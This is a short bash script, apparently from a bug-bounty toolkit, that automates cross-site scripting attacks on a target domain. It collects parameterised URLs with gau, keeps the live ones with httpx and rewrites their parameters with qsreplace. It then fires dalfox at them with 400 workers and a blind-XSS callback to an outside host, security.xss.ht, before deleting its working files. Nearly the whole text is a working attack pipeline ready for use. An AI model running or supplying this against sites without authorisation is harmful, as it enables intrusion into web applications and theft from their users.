#!/bin/bash
#use: ./XSS_dalfox.sh domain.com

echo ' Gau execution'
echo $1 | gau -subs | egrep -o "http?.*" | grep "="| egrep -v ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" >> $1.txt
sort -uf $1.txt > $1_httpx.txt
#Delete similart URL

cat $1_httpx.txt | httpx -mc 200,302 -o $1_check.txt
#using httpx to filter URL's with 200,302 status code

cat $1_check.txt | qsreplace 'xss' | tee sorted.txt
#Replace all parameter value to xss(FUZZ)

sort -uf sorted.txt > $1_todalfox1.txt
#Filter dupicate URL's

sed '/:80/d' $1_todalfox1.txt | tee $1_todalfox.txt
#Delete url with :80 from waybackurl

dalfox file $1_todalfox.txt --worker 400 --blind https://security.xss.ht  --found-action "/root/arsenal/dalfox-noti.sh @@query@@ @@type@@" >> $1_xss.txt;
#Scanning with Dalfox

rm -rf $1.txt
rm -rf sorted.txt
rm -rf $1_httpx.txt
rm -rf $1_check.txt
rm -rf $1_todalfox1.txt
rm -rf $1_todalfox.txt
#Deleting Unwanted files after work

echo "If no xss below file will be deleted"
find /root/ -name "*_xss.txt" -type f -empty
find /root/ -name "*_xss.txt" -type f -empty -delete
# Delete file if XSS not found
